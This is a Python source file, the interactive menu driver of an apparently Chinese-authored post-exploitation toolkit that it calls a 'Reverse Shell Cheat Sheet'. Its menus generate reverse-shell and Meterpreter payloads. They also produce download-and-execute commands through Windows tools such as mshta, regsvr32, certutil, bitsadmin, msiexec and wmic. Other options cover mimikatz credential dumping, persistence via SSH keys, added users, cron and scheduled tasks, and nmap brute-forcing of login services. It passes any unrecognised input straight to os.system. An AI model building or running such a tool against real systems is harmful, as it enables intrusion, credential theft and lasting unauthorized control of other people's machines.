#!/usr/bin/env python3
# encoding:utf8
from core.show_modules import *
from util.util import *
from core.banner import *
from future.builtins import input
from modules import config
from modules import powershell_module
from modules import python_module
from modules import linux_module
from modules import hta_module
from modules import regsvr32_module
from modules import bitsadmin_module
from modules import certutil_module
from modules import msiexec_module
from modules import wmic_module
from modules import msf_module
from modules import nmap_module
from modules import other_module
from modules import persistence_module


__say__ = """
    后渗透的一些攻击方式

    Reverse Shell Cheat Sheet

    metasploit + empire + cobalt + mimikatz

    兼容py2和py3
""" 



def powershell():
    ME = powershell_module.Shell()

    line = p_line('Death') + p_line('PSH') + yellow + ' $> '
    line2 = p_line('Death') + p_line('PSH') + green + '[url]' + yellow + ' $> '
    line3 = p_line('Death') + p_line('PSH') + green + '[file url]' + yellow + ' $> '
    line4 =  p_line('Death') + p_line('PSH') + green + '[scan ip]' + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        p_dec(ME.desc_reverse)
        url = input(line2)
        p_pay(ME.reverse().format(url=url)) if url != "" else p_pay(ME.reverse().format(url=config.cobalt_powershell)) 

    elif choose == "2":
        p_dec(ME.desc_invoke_shellcode)
        p_pay(ME.invoke_shellcode())

    elif choose == "3":
        file_url = input(line3)
        p_pay(ME.downloader().format(url=file_url, file=file_url.split('/')[-1]))

    elif choose == "4":
        p_pay(ME.mimikatz())
        p_pay(ME.mimikatz_base64())

    elif choose == "5":
        p_pay(ME.powerup_check())
        p_pay(ME.powerup_add_user())

    elif choose == "6":
        p_dec(ME.desc_portscan)
        ips = input(line4)
        p_pay(ME.portscan().format(ip=ips))

    elif choose == "7":
        p_dec(ME.desc_keystrokes)

    elif choose == "back":
        main()

    elif choose in ('8', 'exit', 'quit', 'q'):
        bye()

    elif choose == "help":
        powershell_modules()

    elif choose == "info":
        print(ME.info)

    elif choose == "exit":
        bye()

    else:
        os.system(choose)
        powershell()

    powershell()


def python():
    ME = python_module.Shell()

    line = p_line('Death') + p_line('Py') + yellow + ' $> '
    line2 = p_line('Death') + p_line('Py') + green + '[lhost:lport]' + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        p_dec(ME.desc_simple_reverse)
        listen = input(line2)

        if listen == "":
            print("\nUsing default host and port !!!\n")
            p_pay(ME.simple_reverse(config.lhost, config.port_msf))
        else:
            try:
                p_pay(ME.simple_reverse(listen.split(':')[0], listen.split(':')[1]))
            except:
                error("Please input ip:port")
                

    elif choose == "2":
        p_dec(ME.desc_meter_tcp_reverse)
        listen = input(line2)

        if listen == "":
            print("\nUsing default host and port !!!\n")
            return_code = ME.bcode(config.lhost, config.port_msf)
            p_pay(ME.meter_reverse().format(bcode=return_code))
        else:
            try:
                return_code = ME.bcode(listen.split(':')[0], listen.split(':')[1])
                p_pay(ME.meter_reverse().format(bcode=return_code))
            except:
                error("Please input ip:port")
                

    elif choose == "3":
        p_dec(ME.desc_web_delivery)
        p_pay(ME.web_delivery())

    elif choose == "help":
        python_modules()

    elif choose == "back":
        main()

    elif choose == "exit":
        bye()
    else:
        os.system(choose)
        python()
    python()



def linux():
    ME = linux_module.Shell()

    line = p_line('Death') + p_line('Linux') + yellow + ' $> '
    line2 = p_line('Death') + p_line('Linux') + green + '[lhost:lport]' + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        p_dec(ME.desc_reverse)
        listen = input(line2)

        try:
            p_pay(ME.bash_reverse(listen.split(':')[0], listen.split(':')[1]))
        except:
            error("Please input ip:port !!!")
            linux()

    elif choose == "2":
        p_dec(ME.desc_exec_reverse)
        listen = input(line2)

        try:
            p_pay(ME.exec_reverse(listen.split(':')[0], listen.split(':')[1]))
        except:
            error("Please input ip:port !!!")
            linux()

    elif choose == "3":
        listen = input(line2)

        try:
            p_pay(ME.perl_reverse(listen.split(':')[0], listen.split(':')[1]))
        except:
            error("Please input ip:port !!!")
            linux()

    elif choose == "4":
        p_dec(ME.desc_back)
        p_pay(ME.wget_reverse(config.lhost))

    elif choose == "help":
        linux_modules()

    elif choose == "back":
        main()

    elif choose == "exit":
        bye()

    else:
        os.system(choose)
        linux()
    linux()



def mshta():
    HTA = hta_module.Shell()

    line_hta = p_line('Death') + p_line('windows') + p_line('mshta') + green + '[url]' + yellow + ' $> ' + end

    p_dec(HTA.desc_reverse)
    url = input(line_hta)
    if url == "":
        print("Using Default Cobalt url\n")
        print("Reverse_https Listen-port {0} with Cobalt".format(config.port_cobalt))
        p_pay(HTA.reverse(config.cobalt_hta))
        print("Http Listen-port {0} with Empire".format(config.port_empire))
        p_pay(HTA.reverse(config.empire_hta))
    else:
        say_no() if not url.startswith("http") else p_pay(HTA.reverse(url))            


def regsvr32():
    REG = regsvr32_module.Shell()

    line_reg = p_line('Death') + p_line('windows') + p_line('regsvr32') + green + '[url]' + yellow + ' $> '

    p_dec(REG.desc_reverse)
    p_dec(REG.vbs)
    url = input(line_reg)
    if url == "":
        print("\nUsing Default Cobalt url")
        p_pay(REG.reverse(config.cobalt_regsvr32))
    else:
        say_no() if not url.startswith("http") else p_pay(REG.reverse(url))
            



def bitsadmin():
    BIT = bitsadmin_module.Shell()

    line_bit = p_line('Death') + p_line('windows') + p_line('bitsadmin') + green + '[url]' + yellow + ' $> '

    p_dec(BIT.desc_reverse)
    url = input(line_bit)
    if url == "":
        print("\nUsing Default Cobalt url")
        p_pay(BIT.reverse(config.cobalt_bitsadmin, ran_str())) 
    else:
        say_no() if not url.startswith("http") else p_pay(BIT.reverse(url, ran_str()))
                        



def certutil():
    CER = certutil_module.Shell()

    line_cer = p_line('Death') + p_line('windows') + p_line('certutil') + green + '[url]' + yellow + ' $> '

    p_dec(CER.desc_reverse)
    url = input(line_cer)
    if url == "":
        print("\nUsing Default Cobalt url")
        # good
        p_pay(CER.reverse(config.cobalt_exe, ran_str()))
        p_pay(CER.reverse2(config.cobalt_dll, ran_str()))
    else:
        if not url.startswith("http"):
            error("Please input exe url")
            certutil()
        else:
            p_pay(CER.reverse(url, ran_str()))
            p_pay(CER.reverse2(url, ran_str()))



def other():
    Ot = other_module.Shell()

    line_other = p_line('Death') + p_line('windows') + p_line('other') + yellow + ' $> '

    
    choose = input(line_other)
    clear()
    other_modules()

    if choose == "1":
        p_dec(Ot.desc_msbuild)
    elif choose == "2":
        p_dec(Ot.desc_jsc)
    elif choose == "3":
        p_dec(Ot.desc_regasm)
    elif choose == "4":
        p_dec(Ot.desc_regsvcs)
    elif choose == "back":
        windows()
    elif choose == "help":
        other_modules()
    elif choose in ('5', 'exit', 'quit', 'q'):
        bye()
    else:
        other()

    other()



def msiexec():
    MSI = msiexec_module.Shell()

    line_msi = p_line('Death') + p_line('windows') + p_line('msiexec') + green + '[url]' + yellow + ' $> '

    p_dec(MSI.desc_reverse)
    url = input(line_msi)
    if url == "":
        print("\nUsing Default Cobalt url")
        print("\npayload=windows/meterpreter/reverse_tcp,lhost={0},lport={1}\n".format(config.lhost,config.port_msf))
        p_pay(MSI.reverse(config.msf_msi))
    else:
        if not url.startswith("http"):
            error("Please input msi url")
            msiexec()
        else:
            p_pay(MSI.reverse(url))



def wmic():
    WMI = wmic_module.Shell()

    line_wmi = p_line('Death') + p_line('windows') + p_line('wmic') + yellow + ' $> '
    line_ip  = p_line('Death') + p_line('windows') + p_line('wmic') + green + '[ip]' + yellow + ' $> '
    line_user = p_line('Death') + p_line('windows') + p_line('wmic') + green + '[user]' + yellow + ' $> '
    line_pass = p_line('Death') + p_line('windows') + p_line('wmic') + green + '[password]' + yellow + ' $> '
    line_url = p_line('Death') + p_line('windows') + p_line('wmic') + green + '[url]' + yellow + ' $> '

    
    choose = input(line_wmi)

    if choose == "1":
        p_dec(WMI.desc_a)
        ip = input(line_ip)
        good("set ip -> {0}".format(ip))
        user = input(line_user)
        good("set user -> {0}".format(user))
        pwd = input(line_pass)
        good("set password -> {0}".format(pwd))
        p_pay(WMI.wmi_exec(ip, user, pwd)) 

    elif choose == "2":
        p_dec(WMI.desc_mimikatz)
        ip = input(line_ip)
        good("set ip -> {0}".format(ip))
        user = input(line_user)
        good("set ip -> {0}".format(user))
        pwd = input(line_pass)
        good("set ip -> {0}".format(pwd))
        p_pay(WMI.mimikatz(ip, user, pwd))

    elif choose == "3":
        p_dec(WMI.desc_reverse)
        url = input(line_url)
        good("set remote_url -> {0}".format(url))
        p_pay(WMI.reverse(url))

    elif choose == "4":
        p_dec(WMI.command())

    elif choose == "back":
        windows()

    elif choose == "help":
        wmic_modules()
        p_dec(WMI.desc_a)

    elif choose in ('5', 'exit', 'quit', 'q'):
        bye()

    else:
        wmic()

    wmic()



def windows():
    
    line = p_line('Death') + p_line('windows') + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        clear()
        print(banner.wmic)
        wmic_modules()
        wmic()
        
    elif choose == "2":
        mshta()
        
    elif choose == "3":
        regsvr32()  

    elif choose == "4":
        bitsadmin()
    
    elif choose == "5":
        certutil()       

    elif choose == "6":
        msiexec()

    elif choose == "7":
        other()

    elif choose == "help":
        windows_modules()

    elif choose == "back":
        main()

    elif choose in ('8', 'exit', 'quit', 'q'):
        bye()

    else:
        os.system(choose)
        windows()

    windows()


def msfvenom():

    MSF = msf_module.Shell()

    line = p_line('Death') + p_line('MSFvenom') + yellow + ' $> '
    line2 = p_line('Death') + p_line('MSFvenom')
    line3 = green + '[LHOST:LPORT]' + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        listen = input(line2+p_line('windows')+line3)
        p_pay(MSF.meter_re_windows(listen.split(':')[0], listen.split(':')[1])) if listen != "" else say_no()

    elif choose == "2":
        listen = input(line2+p_line('linux')+line3)
        p_pay(MSF.meter_re_linux(listen.split(':')[0], listen.split(':')[1])) if listen != "" else say_no()

    elif choose == "3":
        listen = input(line2+p_line('osx')+line3)
        p_pay(MSF.meter_re_osx(listen.split(':')[0], listen.split(':')[1])) if listen != "" else say_no()

    elif choose == "4":
        listen = input(line2+p_line('android')+line3)
        p_pay(MSF.meter_re_android(listen.split(':')[0], listen.split(':')[1])) if listen != "" else say_no()

    elif choose == "5":
        listen = input(line2+p_line('webshell')+line3)
        p_pay(MSF.meter_re_webshell(listen.split(':')[0], listen.split(':')[1])) if listen != "" else say_no()

    elif choose == "help":
        msf_modules()

    elif choose == "back":
        main()

    elif choose in ('exit', '6', 'quit', 'q'):
        bye()

    else:
        os.system(choose)
        msfvenom()

    msfvenom()


def nmap():
    Shell = nmap_module.Shell()
    line = p_line('Death') + p_line('Nmap') + yellow + ' $> '
    line_ms17 = p_line('Death') + p_line('Nmap') + p_line('MS17-010') + green + '[IPS]' + yellow + ' $> '
    line_heart = p_line('Death') + p_line('Nmap') + p_line('Heartbleed') + green + '[IPS]' + yellow + ' $> '
    line2 = p_line('Death') + p_line('Nmap')
    line3 = green + '[IP:PORT]' + yellow + ' $> '

    choose = input(line)

    if choose == "1":
        Shell.check_ms17_010(input(line_ms17))

    elif choose == "2":
        Shell.check_heartbleed(input(line_heart))

    elif choose == "3":
        ip_port = input(line2 + p_line('FTP') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'ftp')

    elif choose == "4":
        ip_port = input(line2 + p_line('SSH') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'ssh', 1)

    elif choose == "5":
        ip_port = input(line2 + p_line('TELNET') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'telnet')

    elif choose == "6":
        ip_port = input(line2 + p_line('MYSQL') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'mysql')

    elif choose == "7":
        ip_port = input(line2 + p_line('MSSQL') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'mssql')

    elif choose == "8":
        ip_port = input(line2 + p_line('ORACLE') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'oracle')

    elif choose == "9":
        ip_port = input(line2 + p_line('POSTGRES') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'postgres')

    elif choose == "10":
        ip_port = input(line2 + p_line('MONGODB') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'mongodb')

    elif choose == "11":
        ip_port = input(line2 + p_line('REDIS') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'redis')

    elif choose == "12":
        ip_port = input(line2 + p_line('VM') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'vmauthd')

    elif choose == "13":
        ip_port = input(line2 + p_line('SMB') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'smb')

    elif choose == "14":
        ip_port = input(line2 + p_line('RDP') + line3)
        Shell.brute(ip_port.split(':')[0], ip_port.split(':')[1], 'rdp')

    elif choose == "help":
        clear()
        nmap_modules()

    elif choose == "back":
        main()

    elif choose in ('exit', '6', 'quit', 'q'):
        bye()

    else:
        os.system(choose)
        nmap()

    nmap()


def persistence():
    Shell = persistence_module.Shell()
    line = p_line('Death') + p_line('Persistence') + yellow + ' $> '

    choose = input(line)

    if choose == "1":p_dec(Shell.SSHKey())

    elif choose == "2":p_dec(Shell.AddUser())

    elif choose == "3":p_dec(Shell.Crontab())

    elif choose == "4":p_dec(Shell.Startup())

    elif choose == "5":p_dec(Shell.Ln())

    elif choose == "7":p_dec(Shell.Shift())

    elif choose == "9":p_dec(Shell.Schtasks())

    elif choose == "back":main()

    elif choose == "help":clear();persistence_modules()

    elif choose in ('exit', '12', 'quit', 'q'):bye()

    else:persistence()

    persistence()



def main():

    line = p_line('Death') + yellow + ' $> '
    main_choice = input(line)

    if main_choice == "1":
        clear()
        print(banner.windows)
        windows_modules()
        windows()

    elif main_choice == "2":
        clear()
        print(banner.linux)
        linux_modules()
        linux()

    elif main_choice == "3":
        clear()
        print(banner.ps)
        powershell_modules() # list modules
        powershell()         

    elif main_choice == "4":
        clear()
        print(banner.py)
        python_modules()
        python()

    elif main_choice == "5":
        clear()
        print(banner.msfvenom)
        msf_modules()
        msfvenom()

    elif main_choice == "6":
        clear()
        print(banner.nmap)
        nmap_modules()
        nmap()

    elif main_choice == "7":
        clear()
        print(banner.persistence)
        persistence_modules()
        persistence()


    elif main_choice == "":
        main()

    elif main_choice == "help":
        print(banner.ban)
        banner_main()
        show_modules()

    elif main_choice == "clear":
        clear()

    elif main_choice in ('7', 'exit', 'quit', 'q'):
        bye()

    else:
        os.system(main_choice)
    main()

def exploit():
    print(banner.ban)
    banner_main()
    show_modules()
    try:
        main()
    except KeyboardInterrupt:
        bye()


if __name__ == "__main__":
    exploit()
